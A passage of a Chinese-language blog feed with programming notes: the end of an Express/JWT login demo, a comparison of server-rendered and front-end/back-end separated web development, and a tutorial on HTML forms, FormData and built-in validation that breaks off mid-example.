class="string">&#x27;xiaochunzuishuai^_^&#x27;</span>;</span><br><span class="line"><span class="comment">//以/api/开头的不用权限，配置成功了express-jwt这个中间件，就可以把解析出来的用户信息挂载到req.user上</span></span><br><span class="line">app.use(expressJWT(&#123;</span><br><span class="line">    <span class="attr">secret</span>:secretkey,</span><br><span class="line">    <span class="attr">algorithms</span>: [<span class="string">&#x27;HS256&#x27;</span>],</span><br><span class="line">    &#125;).unless(&#123;<span class="attr">path</span>:[<span class="regexp">/^\/api\//</span>]&#125;))</span><br><span class="line"><span class="keyword">const</span> bodyParser=<span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>)</span><br><span class="line">app.use(cors());</span><br><span class="line"></span><br><span class="line"><span class="comment">//托管静态页面</span></span><br><span class="line">app.use(express.static(<span class="string">&#x27;./pages&#x27;</span>));</span><br><span class="line"><span class="comment">//自定义解析Post提交过来的表单数据</span></span><br><span class="line">app.use(bodyParser.urlencoded(&#123;<span class="attr">extended</span>:<span class="literal">false</span>&#125;))</span><br><span class="line">app.use(bodyParser.json())</span><br><span class="line"><span class="comment">//登录API接口</span></span><br><span class="line">app.post(<span class="string">&#x27;/api/login&#x27;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="comment">//判断用户提交的登录信息是否正确</span></span><br><span class="line">   <span class="keyword">const</span> userInfo=req.body;</span><br><span class="line">    <span class="keyword">if</span>(userInfo.username!==<span class="string">&quot;admin&quot;</span>||userInfo.password!==<span class="string">&quot;888888&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.send(&#123;<span class="attr">status</span>:<span class="number">1</span>,<span class="attr">msg</span>:<span class="string">&#x27;登录失败&#x27;</span>&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//登录成功生成JWT字符串，通过token属性响应给客户端</span></span><br><span class="line">    res.send(&#123;</span><br><span class="line">        <span class="attr">satus</span>:<span class="number">0</span>,</span><br><span class="line">        <span class="attr">msg</span>:<span class="string">&#x27;success&#x27;</span>,</span><br><span class="line">        <span class="comment">//不要把密码加密到token字符串中</span></span><br><span class="line">        <span class="attr">token</span>:jwt.sign(&#123;<span class="attr">username</span>:userInfo.username&#125;,secretkey,&#123;<span class="attr">expiresIn</span>:<span class="string">&#x27;100s&#x27;</span>&#125;),</span><br><span class="line">        <span class="attr">data</span>:req.user</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//有权限的接口,配置成功了express-jwt这个中间件，有权限的接口就可以通过req.user获取解析出来的用户信息</span></span><br><span class="line">app.get(<span class="string">&#x27;/admin/getInfo&#x27;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">    res.send(&#123;</span><br><span class="line">        <span class="attr">status</span>:<span class="number">0</span>,</span><br><span class="line">        <span class="attr">msg</span>:<span class="string">&#x27;success&#x27;</span>,</span><br><span class="line">        <span class="attr">data</span>:req.user</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//退出登录的接口</span></span><br><span class="line">app.post(<span class="string">&#x27;/api/logout&#x27;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">    res.send(&#123;</span><br><span class="line">        <span class="attr">status</span>:<span class="number">0</span>,</span><br><span class="line">        <span class="attr">msg</span>:<span class="string">&#x27;退出登录成功&#x27;</span></span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//配置全局错误处理中间件</span></span><br><span class="line">app.use(<span class="function">(<span class="params">err,req,res,next</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="comment">//token解析失败导致的错误,Token过期或不合法</span></span><br><span class="line">    <span class="keyword">if</span>(err.name===<span class="string">&#x27;UnauthorizedError&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.send(&#123;<span class="attr">status</span>:<span class="number">401</span>,<span class="attr">message</span>:<span class="string">&#x27;无效的token&#x27;</span>&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//其他原因导致的错误</span></span><br><span class="line">    res.send(&#123;<span class="attr">status</span>:<span class="number">500</span>,<span class="attr">message</span>:<span class="string">&#x27;未知错误&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line">app.listen(<span class="number">80</span>,<span class="function">()=&gt;</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;运行在http://127.0.0.1&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;不同身份认证方案：&quot;&gt;&lt;a href=&quot;#不同身份认证方案：&quot; class=&quot;headerlink&quot; title=&quot;不同身份认证方案：&quot;&gt;&lt;/a&gt;不同身份认证方案：&lt;/h1&gt;&lt;p&gt;服务端渲染推荐使用Session认证机制&lt;/p&gt;
&lt;p&gt;前后端分离推荐使用JWT认证</summary>
      
    
    
    
    <category term="Node" scheme="https://coloey.github.io/categories/Node/"/>
    
    
  </entry>
  
  <entry>
    <title>Web开发模式</title>
    <link href="https://coloey.github.io/2022/03/21/Web%E5%BC%80%E5%8F%91%E6%A8%A1%E5%BC%8F/"/>
    <id>https://coloey.github.io/2022/03/21/Web%E5%BC%80%E5%8F%91%E6%A8%A1%E5%BC%8F/</id>
    <published>2022-03-21T05:52:34.000Z</published>
    <updated>2022-03-21T06:09:19.188Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Web开发模式："><a href="#Web开发模式：" class="headerlink" title="Web开发模式："></a>Web开发模式：</h1><h2 id="服务端渲染的Web开发模式"><a href="#服务端渲染的Web开发模式" class="headerlink" title="服务端渲染的Web开发模式"></a>服务端渲染的Web开发模式</h2><p>服务器发送给客户端的HTML页面是通在服务器通过字符串的拼接动态生成的。因此客户端不需要通过Ajax技术额外请求页面的数据</p><p>优点：</p><ol><li>前端耗时少，因为服务端通过动态生成HTML内容，浏览器只需要直接渲染页面即可，尤其是移动端，更省电</li><li>有利于SEO，服务器响应的是完整的HTML页面，所以爬虫更容易获取信息，有利于SEO</li></ol><p>缺点：</p><ol><li>占用服务器资源，如果请求较多，会对服务器造成一定压力</li><li>不利于前后端分离，开发效率低。使用服务端渲染，则无法进行分工合作，尤其对于前端复杂的项目，不利于羡慕高效开发</li></ol><h2 id="前后端分离的Web开发模式："><a href="#前后端分离的Web开发模式：" class="headerlink" title="前后端分离的Web开发模式："></a>前后端分离的Web开发模式：</h2><p>依赖于Ajax技术，后端负责接口开发，前端使用Ajav=x调用接口的开发模式</p><p>优点：</p><ol><li>开发体验好，前端专注于UI开发，后端专注于接口开发</li><li>用户体验好，Ajax技术的应用，提高用户的体验，轻松实现局部页面刷新</li><li>减轻服务端的渲染压力，页面最终是在浏览器中生成的</li></ol><p>缺点：</p><p>不利于SEO，完整的HTML页面需要在客户端动态拼接，所有爬虫无法提取页面有效信息，解决方法：利用Vue,React等前端框架的SSR技术解决</p><h2 id="如何选择Web开发模式："><a href="#如何选择Web开发模式：" class="headerlink" title="如何选择Web开发模式："></a>如何选择Web开发模式：</h2><ul><li>看业务场景</li><li>主要功能是展示页面且没有复杂交互并且需要良好的SEO，用服务端渲染</li><li>后台管理项目等交互性强用前后端分离</li><li>一般两者都会一起用</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Web开发模式：&quot;&gt;&lt;a href=&quot;#Web开发模式：&quot; class=&quot;headerlink&quot; title=&quot;Web开发模式：&quot;&gt;&lt;/a&gt;Web开发模式：&lt;/h1&gt;&lt;h2 id=&quot;服务端渲染的Web开发模式&quot;&gt;&lt;a href=&quot;#服务端渲染的Web开发模式&quot; c</summary>
      
    
    
    
    <category term="Node" scheme="https://coloey.github.io/categories/Node/"/>
    
    
  </entry>
  
  <entry>
    <title>FormData</title>
    <link href="https://coloey.github.io/2022/03/21/FormData/"/>
    <id>https://coloey.github.io/2022/03/21/FormData/</id>
    <published>2022-03-21T03:13:21.000Z</published>
    <updated>2022-03-21T03:14:47.585Z</updated>
    
    <content type="html"><![CDATA[<h1 id="表单，FormData-对象"><a href="#表单，FormData-对象" class="headerlink" title="表单，FormData 对象"></a>表单，FormData 对象</h1><h5 id="目录-隐藏"><a href="#目录-隐藏" class="headerlink" title="目录 [隐藏]"></a>目录 [隐藏]</h5><ul><li><a href="https://wangdoc.com/javascript/bom/form.html#%E8%A1%A8%E5%8D%95%E6%A6%82%E8%BF%B0">表单概述</a></li><li>FormData 对象<ul><li><a href="https://wangdoc.com/javascript/bom/form.html#%E6%A6%82%E8%BF%B0">概述</a></li><li><a href="https://wangdoc.com/javascript/bom/form.html#%E5%AE%9E%E4%BE%8B%E6%96%B9%E6%B3%95">实例方法</a></li></ul></li><li>表单的内置验证<ul><li><a href="https://wangdoc.com/javascript/bom/form.html#%E8%87%AA%E5%8A%A8%E6%A0%A1%E9%AA%8C">自动校验</a></li><li><a href="https://wangdoc.com/javascript/bom/form.html#checkvalidity">checkValidity()</a></li><li><a href="https://wangdoc.com/javascript/bom/form.html#willvalidate-%E5%B1%9E%E6%80%A7">willValidate 属性</a></li><li><a href="https://wangdoc.com/javascript/bom/form.html#validationmessage-%E5%B1%9E%E6%80%A7">validationMessage 属性</a></li><li><a href="https://wangdoc.com/javascript/bom/form.html#setcustomvalidity">setCustomValidity()</a></li><li><a href="https://wangdoc.com/javascript/bom/form.html#validity-%E5%B1%9E%E6%80%A7">validity 属性</a></li><li><a href="https://wangdoc.com/javascript/bom/form.html#%E8%A1%A8%E5%8D%95%E7%9A%84-novalidate-%E5%B1%9E%E6%80%A7">表单的 novalidate 属性</a></li></ul></li><li><a href="https://wangdoc.com/javascript/bom/form.html#enctype-%E5%B1%9E%E6%80%A7">enctype 属性</a></li><li><a href="https://wangdoc.com/javascript/bom/form.html#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">文件上传</a></li><li><a href="https://wangdoc.com/javascript/bom/form.html#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5">参考链接</a></li></ul><h2 id="表单概述"><a href="#表单概述" class="headerlink" title="表单概述"></a>表单概述</h2><p>表单（<code>&lt;form&gt;</code>）用来收集用户提交的数据，发送到服务器。比如，用户提交用户名和密码，让服务器验证，就要通过表单。表单提供多种控件，让开发者使用，具体的控件种类和用法请参考 HTML 语言的教程。本章主要介绍 JavaScript 与表单的交互。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;/handling-page&quot; method=&quot;post&quot;&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;label for=&quot;name&quot;&gt;用户名：&lt;/label&gt;</span><br><span class="line">    &lt;input type=&quot;text&quot; id=&quot;name&quot; name=&quot;user_name&quot; /&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;label for=&quot;passwd&quot;&gt;密码：&lt;/label&gt;</span><br><span class="line">    &lt;input type=&quot;password&quot; id=&quot;passwd&quot; name=&quot;user_passwd&quot; /&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; id=&quot;submit&quot; name=&quot;submit_button&quot; value=&quot;提交&quot; /&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>上面代码就是一个简单的表单，包含三个控件：用户名输入框、密码输入框和提交按钮。</p><p>用户点击“提交”按钮，每一个控件都会生成一个键值对，键名是控件的<code>name</code>属性，键值是控件的<code>value</code>属性，键名和键值之间由等号连接。比如，用户名输入框的<code>name</code>属性是<code>user_name</code>，<code>value</code>属性是用户输入的值，假定是“张三”，提交到服务器的时候，就会生成一个键值对<code>user_name=张三</code>。</p><p>所有的键值对都会提交到服务器。但是，提交的数据格式跟<code>&lt;form&gt;</code>元素的<code>method</code>属性有关。该属性指定了提交数据的 HTTP 方法。如果是 GET 方法，所有键值对会以 URL 的查询字符串形式，提交到服务器，比如<code>/handling-page?user_name=张三&amp;user_passwd=123&amp;submit_button=提交</code>。下面就是 GET 请求的 HTTP 头信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /handling-page?user_name=张三&amp;user_passwd=123&amp;submit_button=提交</span><br><span class="line">Host: example.com</span><br></pre></td></tr></table></figure><p>如果是 POST 方法，所有键值对会连接成一行，作为 HTTP 请求的数据体发送到服务器，比如<code>user_name=张三&amp;user_passwd=123&amp;submit_button=提交</code>。下面就是 POST 请求的头信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /handling-page HTTP/1.1</span><br><span class="line">Host: example.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 74</span><br><span class="line"></span><br><span class="line">user_name=张三&amp;user_passwd=123&amp;submit_button=提交</span><br></pre></td></tr></table></figure><p>注意，实际提交的时候，只要键值不是 URL 的合法字符（比如汉字“张三”和“提交”），浏览器会自动对其进行编码。</p><p>点击<code>submit</code>控件，就可以提交表单。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;form&gt;</span><br><span class="line">  &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>上面表单就包含一个<code>submit</code>控件，点击这个控件，浏览器就会把表单数据向服务器提交。</p><p>注意，表单里面的<code>&lt;button&gt;</code>元素如果没有用<code>type</code>属性指定类型，那么默认就是<code>submit</code>控件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;form&gt;</span><br><span class="line">  &lt;button&gt;提交&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>上面表单的<code>&lt;button&gt;</code>元素，点击以后也会提交表单。</p><p>除了点击<code>submit</code>控件提交表单，还可以用表单元素的<code>submit()</code>方法，通过脚本提交表单。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">formElement.submit();</span><br></pre></td></tr></table></figure><p>表单元素的<code>reset()</code>方法可以重置所有控件的值（重置为默认值）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">formElement.reset()</span><br></pre></td></tr></table></figure><h2 id="FormData-对象"><a href="#FormData-对象" class="headerlink" title="FormData 对象"></a>FormData 对象</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>表单数据以键值对的形式向服务器发送，这个过程是浏览器自动完成的。但是有时候，我们希望通过脚本完成这个过程，构造或编辑表单的键值对，然后通过脚本发送给服务器。浏览器原生提供了 FormData 对象来完成这项工作。</p><p><code>FormData()</code>首先是一个构造函数，用来生成表单的实例。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var formdata = new FormData(form);</span><br></pre></td></tr></table></figure><p><code>FormData()</code>构造函数的参数是一个 DOM 的表单元素，构造函数会自动处理表单的键值对。这个参数是可选的，如果省略该参数，就表示一个空的表单。</p><p>下面是一个表单。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;form id=&quot;myForm&quot; name=&quot;myForm&quot;&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;label for=&quot;username&quot;&gt;用户名：&lt;/label&gt;</span><br><span class="line">    &lt;input type=&quot;text&quot; id=&quot;username&quot; name=&quot;username&quot;&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;label for=&quot;useracc&quot;&gt;账号：&lt;/label&gt;</span><br><span class="line">    &lt;input type=&quot;text&quot; id=&quot;useracc&quot; name=&quot;useracc&quot;&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;label for=&quot;userfile&quot;&gt;上传文件：&lt;/label&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; id=&quot;userfile&quot; name=&quot;userfile&quot;&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;Submit!&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>我们用<code>FormData()</code>处理上面这个表单。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var myForm = document.getElementById(&#x27;myForm&#x27;);</span><br><span class="line">var formData = new FormData(myForm);</span><br><span class="line"></span><br><span class="line">// 获取某个控件的值</span><br><span class="line">formData.get(&#x27;username&#x27;) // &quot;&quot;</span><br><span class="line"></span><br><span class="line">// 设置某个控件的值</span><br><span class="line">formData.set(&#x27;username&#x27;, &#x27;张三&#x27;);</span><br><span class="line"></span><br><span class="line">formData.get(&#x27;username&#x27;) // &quot;张三&quot;</span><br></pre></td></tr></table></figure><h3 id="实例方法"><a href="#实例方法" class="headerlink" title="实例方法"></a>实例方法</h3><p>FormData 提供以下实例方法。</p><ul><li><code>FormData.get(key)</code>：获取指定键名对应的键值，参数为键名。如果有多个同名的键值对，则返回第一个键值对的键值。</li><li><code>FormData.getAll(key)</code>：返回一个数组，表示指定键名对应的所有键值。如果有多个同名的键值对，数组会包含所有的键值。</li><li><code>FormData.set(key, value)</code>：设置指定键名的键值，参数为键名。如果键名不存在，会添加这个键值对，否则会更新指定键名的键值。如果第二个参数是文件，还可以使用第三个参数，表示文件名。</li><li><code>FormData.delete(key)</code>：删除一个键值对，参数为键名。</li><li><code>FormData.append(key, value)</code>：添加一个键值对。如果键名重复，则会生成两个相同键名的键值对。如果第二个参数是文件，还可以使用第三个参数，表示文件名。</li><li><code>FormData.has(key)</code>：返回一个布尔值，表示是否具有该键名的键值对。</li><li><code>FormData.keys()</code>：返回一个遍历器对象，用于<code>for...of</code>循环遍历所有的键名。</li><li><code>FormData.values()</code>：返回一个遍历器对象，用于<code>for...of</code>循环遍历所有的键值。</li><li><code>FormData.entries()</code>：返回一个遍历器对象，用于<code>for...of</code>循环遍历所有的键值对。如果直接用<code>for...of</code>循环遍历 FormData 实例，默认就会调用这个方法。</li></ul><p>下面是<code>get()</code>、<code>getAll()</code>、<code>set()</code>、<code>append()</code>方法的例子。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var formData = new FormData();</span><br><span class="line"></span><br><span class="line">formData.set(&#x27;username&#x27;, &#x27;张三&#x27;);</span><br><span class="line">formData.append(&#x27;username&#x27;, &#x27;李四&#x27;);</span><br><span class="line">formData.get(&#x27;username&#x27;) // &quot;张三&quot;</span><br><span class="line">formData.getAll(&#x27;username&#x27;) // [&quot;张三&quot;, &quot;李四&quot;]</span><br><span class="line"></span><br><span class="line">formData.append(&#x27;userpic[]&#x27;, myFileInput.files[0], &#x27;user1.jpg&#x27;);</span><br><span class="line">formData.append(&#x27;userpic[]&#x27;, myFileInput.files[1], &#x27;user2.jpg&#x27;);</span><br></pre></td></tr></table></figure><p>下面是遍历器的例子。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">var formData = new FormData();</span><br><span class="line">formData.append(&#x27;key1&#x27;, &#x27;value1&#x27;);</span><br><span class="line">formData.append(&#x27;key2&#x27;, &#x27;value2&#x27;);</span><br><span class="line"></span><br><span class="line">for (var key of formData.keys()) &#123;</span><br><span class="line">  console.log(key);</span><br><span class="line">&#125;</span><br><span class="line">// &quot;key1&quot;</span><br><span class="line">// &quot;key2&quot;</span><br><span class="line"></span><br><span class="line">for (var value of formData.values()) &#123;</span><br><span class="line">  console.log(value);</span><br><span class="line">&#125;</span><br><span class="line">// &quot;value1&quot;</span><br><span class="line">// &quot;value2&quot;</span><br><span class="line"></span><br><span class="line">for (var pair of formData.entries()) &#123;</span><br><span class="line">  console.log(pair[0] + &#x27;: &#x27; + pair[1]);</span><br><span class="line">&#125;</span><br><span class="line">// key1: value1</span><br><span class="line">// key2: value2</span><br><span class="line"></span><br><span class="line">// 等同于遍历 formData.entries()</span><br><span class="line">for (var pair of formData) &#123;</span><br><span class="line">  console.log(pair[0] + &#x27;: &#x27; + pair[1]);</span><br><span class="line">&#125;</span><br><span class="line">// key1: value1</span><br><span class="line">// key2: value2</span><br></pre></td></tr></table></figure><h2 id="表单的内置验证"><a href="#表单的内置验证" class="headerlink" title="表单的内置验证"></a>表单的内置验证</h2><h3 id="自动校验"><a href="#自动校验" class="headerlink" title="自动校验"></a>自动校验</h3><p>表单提交的时候，浏览器允许开发者指定一些条件，它会自动验证各个表单控件的值是否符合条件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 必填 --&gt;</span><br><span class="line">&lt;input required&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 必须符合正则表达式 --&gt;</span><br><span class="line">&lt;input pattern=&quot;banana|cherry&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 字符串长度必须为6个字符 --&gt;</span><br><span class="line">&lt;input minlength=&quot;6&quot; maxlength=&quot;6&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 数值必须在1到10之间 --&gt;</span><br><span class="line">&lt;input type=&quot;number&quot; min=&quot;1&quot; max=&quot;10&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 必须填入 Email 地址 --&gt;</span><br><span class="line">&lt;input type=&quot;email&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 必须填入 URL --&gt;</span><br><span class="line">&lt;input type=&quot;URL&quot;&gt;</span><br></pre></td></tr></table></figure><p>如果一个控件通过验证，它就会匹配<code>:valid</code>的 CSS 伪类，浏览器会继续进行表单提交的流程。如果没有通过验证，该控件就会匹配<code>:invalid</code>的 CSS 伪类，浏览器会终止表单提交，并显示一个错误信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">input:invalid &#123;</span><br><span class="line">  border-color: red;</span><br><span class="line">&#125;</span><br><span class="line">input,</span><br><span class="line">input:valid &#123;</span><br><span class="line">  border-color: #ccc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="checkValidity"><a href="#checkValidity" class="headerlink" title="checkValidity()"></a>checkValidity()</h3><p>除了提交表单的时候，浏览器自动校验表单，还可以手动触发表单的校验。表单元素和表单控件都有<code>checkValidity()</code>方法，用于手动触发校验。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 触发整个表单的校验</span><br><span class="line">form.checkValidity()</span><br><span class="line"></span><br><span class="line">// 触发单个表单控件的校验</span><br><span class="line">formControl.checkValidity()</span><br></pre></td></tr></table></figure><p><code>checkValidity()</code>方法返回一个布尔值，<code>true</code>表示通过校验，<code>false</code>表示没有通过校验。因此，提交表单可以封装为下面的函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function submitForm(action) &#123;</span><br><span class="line">  var form = document.getElementById(&#x27;form&#x27;);</span><br><span class="line">  form.action = action;</span><br><span class="line">  if (form.checkValidity()) &#123;</span><br><span class="line">    form.submit();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="willValidate-属性"><a href="#willValidate-属性" class="headerlink" title="willValidate 属性"></a>willValidate 属性</h3><p>控件元素的<code>willValidate</code>属性是一个布尔值，表示该控件是否会在提交时进行校验。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// HTML 代码如下</span><br><span class="line">// &lt;form novalidate&gt;</span><br><span class="line">//   &lt;input id=&quot;name&quot; name=&quot;name&quot; required /&gt;</span><br><span class="line">// &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">var input = document.querySelector(&#x27;#name&#x27;);</span><br><span class="line">input.willValidate // true</span><br></pre></td></tr></table></figure><h3 id="validationMessage-属性"><a href="#validationMessage-属性" class="headerlink" title="validationMessage 属性"></a>validationMessage 属性</h3><p>控件元素的<code>validationMessage</code>属性返回一个字符串，表示控件不满足校验条件时，浏览器显示的提示文本。以下两种情况，该属性返回空字符串。</p><ul><li>该控件不会在提交时自动校验</li><li>该控件满足校验条件</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// HTML 代码如下</span><br><span class="line">// &lt;form&gt;&lt;input type=&quot;text&quot; required&gt;&lt;/form&gt;</span><br><span class="line">document.querySelector(&#x27;form input&#x27;).validationMessage</span><br><span class="line">// &quot;请填写此字段。&quot;</span><br></pre></td></tr></table></figure><p>下面是另一个例子。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var myInput = document.getElementById(&#x27;myinput&#x27;);</span><br><span class="line">if (!myInput.checkValidity()) &#123;</span><br><span class="line">  document.getElementById(&#x27;prompt&#x27;).innerHTML = myInput.validationMessage;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="setCustomValidity"><a href="#setCustomValidity" class="headerlink" title="setCustomValidity()"></a>setCustomValidity()</h3><p>控件元素的<code>setCustomValidity()</code>方法用来定制校验失败时的报错信息。它接受一个字符串作为参数，该字符串就是定制的报错信息。如果参数为空字符串，则上次设置的报错信息被清除。</p><p>这个方法可以替换浏览器内置的表单验证报错信息，参数就是要显示的报错信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;somefile.php&quot;&gt;</span><br><span class="line">  &lt;input</span><br><span class="line">    type=&quot;text&quot;</span><br><span class="line">    name=&quot;username&quot;</span><br><span class="line">    placeholder=&quot;Username&quot;</span><br><span class="line">    pattern=&quot;[a-z]&#123;1,15&#125;&quot;</span><br><span class="line">    id=&quot;username&quot;</span><br><span class="line">  &gt;</span><br><span class="line">  &lt;input type=&quot;submit&quot;&gt;</span><br><span 